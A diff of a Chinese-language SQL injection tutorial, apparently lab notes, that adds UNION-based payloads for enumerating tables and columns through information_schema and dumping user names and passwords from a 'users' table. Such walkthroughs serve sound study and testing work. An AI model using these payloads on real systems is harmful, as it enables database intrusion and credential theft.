@@ -20,37 +20,21 @@ Step 2.
 
 因為 SELECT 出來的變數數量會被前台顯示限制住，所以可以會加入 group_concat(variable1, variable2, ...) 全部顯示出來。
 
-因此可以將 '$id' 改成 UNION SELECT version(), database(); # 來查詢資料庫
+因此可以將 '$id' 改成：UNION SELECT version(), database(); # 來查詢資料庫
 
 Step 3.
 ---
 
 MySQL 5.0 以上存在 information_schema，可以利用 information_schema 獲得資料庫進一步資訊
-<table>
-  <tr>
-    <td>Column name</td>
-    <td>Data type</td>
-    <td>Description</td>
-  </tr>
-  <tr>
-    <td>TABLE_CATALOG</td>
-    <td>nvarchar(128)</td>
-    <td>Table qualifier.</td>
-  </tr>
-  <tr>
-    <td>TABLE_SCHEMA</td>
-    <td>nvarchar(128)</td>
-    <td>Name of schema that contains the table.</td>
-  </tr>
-  <tr>
-    <td>TABLE_NAME</td>
-    <td>sysname</td>
-    <td>Table name.</td>
-  </tr>
-  <tr>
-    <td>TABLE_TYPE</td>
-    <td>varchar(10)</td>
-    <td>Type of table. Can be VIEW or BASE TABLE.</td>
-  </tr>
-</table>
-0..0
+
+找出資料庫裡所對應的所有資料表：SELECT table_name FROM information_schema.tables
+
+所以套用上面的概念，可以改寫成：1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = database(); #
+
+上面語法可以看到系統會使用到那些 Table 進行 query，接著再根據 Table 去查該 Table 有哪些欄位(column)：
+
+改寫成：1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'; #
+
+知道使用哪張 Table，又知道 Table 裡面有哪些欄位，那就可以來查想要的資料了
+
+查看帳號和密碼：1' UNION SELECT 1, group_concat(user, password) FROM users; #
